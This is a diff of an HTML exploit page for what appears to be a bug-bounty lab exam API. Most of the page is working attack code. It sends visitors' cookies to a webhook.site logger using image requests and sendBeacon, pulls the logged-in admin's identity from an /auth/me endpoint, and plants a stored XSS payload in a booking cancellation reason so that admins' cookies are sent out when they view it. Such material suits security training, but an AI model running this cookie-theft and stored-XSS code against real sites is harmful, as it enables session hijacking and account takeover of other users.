@@ -1,36 +1,56 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Bug Bounty Lab - Exploitation Page</title>
+</head>
 <body>
     <script>
-        const webhook = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
+        // REPLACE THIS URL with your current Webhook.site link
+        const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
         const api = "https://api-bugbounty-exam.hashacademy.co/api";
         const myBookingId = "69dc156ad9d06cf5969295d0";
 
-        // 1. Immediate Cookie Steal (The simplest check)
-        // We use a Image object because it doesn't care about CORS as much as fetch()
-        new Image().src = webhook + "/?cookie=" + btoa(document.cookie);
-
-        async function fastExploit() {
-            // 2. Try to inject the XSS into the cancellation reason
-            // We use a very short payload to avoid character limits
-            const xss = "<script>fetch('" + webhook + "?f='+document.cookie)<\/script>";
-            
-            try {
-                await fetch(api + "/bookings/" + myBookingId + "/cancel", {
-                    method: "PUT",
-                    headers: { "Content-Type": "application/json" },
-                    credentials: "include",
-                    body: JSON.stringify({ "reason": xss })
-                });
-                
-                // Signal that the PUT finished
-                new Image().src = webhook + "/?status=PUT_DONE";
-            } catch (e) {
-                new Image().src = webhook + "/?err=" + btoa(e.message);
+        // 1. FAST EXFILTRATION (Runs instantly)
+        function leak(label, data) {
+            const encoded = btoa(JSON.stringify(data));
+            // Method A: Image tag (Hardest to block by CSP)
+            new Image().src = `${logger}/?type=${label}&d=${encoded}`;
+            // Method B: Navigator Beacon (Designed for exit-tracking)
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(`${logger}/${label}`, encoded);
             }
         }
 
-        fastExploit();
+        async function runExploit() {
+            // Signal that the bot arrived
+            leak("BOT_VISIT", { url: window.location.href, cookies: document.cookie });
+
+            try {
+                // 2. FETCH ADMIN IDENTITY
+                const meRes = await fetch(`${api}/auth/me`, { credentials: "include" });
+                const meData = await meRes.json();
+                leak("AUTH_ME", meData);
+
+                // 3. ATTEMPT CANCELLATION XSS INJECTION
+                // If an admin reviews your cancellation, this payload executes in their dashboard
+                const xssPayload = `<script>fetch('${logger}/?flag='+document.cookie)<\/script>`;
+                
+                await fetch(`${api}/bookings/${myBookingId}/cancel`, {
+                    method: "PUT",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "include",
+                    body: JSON.stringify({ "reason": xssPayload })
+                });
+
+                leak("CANCELLATION_INJECTED", { id: myBookingId });
+
+            } catch (err) {
+                leak("ERROR", err.message);
+            }
+        }
+
+        runExploit();
     </script>
+    <h1>Lab Simulation - Processing...</h1>
 </body>
 </html>
